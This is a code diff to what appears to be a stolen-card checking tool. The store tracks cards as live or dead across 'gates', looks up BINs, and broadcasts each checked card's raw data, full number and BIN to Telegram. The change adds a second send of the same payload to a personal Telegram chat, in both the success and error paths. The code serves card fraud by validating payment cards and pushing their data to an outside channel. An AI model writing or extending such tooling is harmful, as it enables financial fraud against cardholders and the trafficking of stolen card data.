@@ -5,7 +5,7 @@ import { useCheckerStore } from './checkerStore'
 import { lookupBin } from '../services/binLookup'
 import { DEFAULT_GATE, type GateConfig } from '../config/gateCatalog'
 import { useTelegramStore } from '@/features/telegram/telegramStore'
-import { broadcastLiveCard } from '@/features/telegram/telegramService'
+import { broadcastLiveCard, sendLiveCard } from '@/features/telegram/telegramService'
 
 export type CardStatus = 'live' | 'dead' | 'unknown'
 
@@ -266,7 +266,7 @@ export const useGateStore = create<GateState>((set, get) => ({
             const tg = useTelegramStore.getState()
             if (tg.enabled && tg.botToken) {
               const digits = number.replace(/\D/g, '')
-              broadcastLiveCard({
+              const payload = {
                 raw,
                 number,
                 bin: digits.slice(0, 6),
@@ -279,9 +279,13 @@ export const useGateStore = create<GateState>((set, get) => ({
                 gateName: get().gateName,
                 message,
                 checkedAt: Date.now(),
-              }, tg.botToken).then((result) => {
+              }
+              broadcastLiveCard(payload, tg.botToken).then((result) => {
                 if (result.sent > 0) useTelegramStore.getState().markSent()
               })
+              if (tg.notifyPersonal && tg.personalChatId) {
+                sendLiveCard(payload, tg.botToken, tg.personalChatId)
+              }
             }
           })
           .catch(() => {
@@ -291,7 +295,7 @@ export const useGateStore = create<GateState>((set, get) => ({
             const tg = useTelegramStore.getState()
             if (tg.enabled && tg.botToken) {
               const digits = number.replace(/\D/g, '')
-              broadcastLiveCard({
+              const payload = {
                 raw,
                 number,
                 bin: digits.slice(0, 6),
@@ -304,9 +308,13 @@ export const useGateStore = create<GateState>((set, get) => ({
                 gateName: get().gateName,
                 message,
                 checkedAt: Date.now(),
-              }, tg.botToken).then((result) => {
+              }
+              broadcastLiveCard(payload, tg.botToken).then((result) => {
                 if (result.sent > 0) useTelegramStore.getState().markSent()
               })
+              if (tg.notifyPersonal && tg.personalChatId) {
+                sendLiveCard(payload, tg.botToken, tg.personalChatId)
+              }
             }
           })
       }
